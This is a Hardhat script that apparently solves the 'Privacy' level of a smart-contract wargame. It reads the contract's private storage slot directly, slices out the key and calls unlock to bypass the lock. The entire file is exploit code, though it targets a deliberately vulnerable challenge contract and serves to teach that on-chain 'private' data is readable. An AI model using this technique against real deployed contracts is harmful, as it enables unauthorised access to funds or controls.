import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0x24B3c7704709ed1491473F30393FFc93cFB0FC34"
const PLAYER_ADDRESS = "0xBcd4042DE499D14e55001CcbB24a551F3b954096"

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS)
  const contract = await ethers.getContractAt("Privacy", CONTRACT_ADDRESS, signer)

  console.log(await contract.locked())

  const key = (await ethers.provider.getStorage(CONTRACT_ADDRESS, 5)).slice(0, 34)

  await contract.unlock(key)

  console.log(await contract.locked())
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
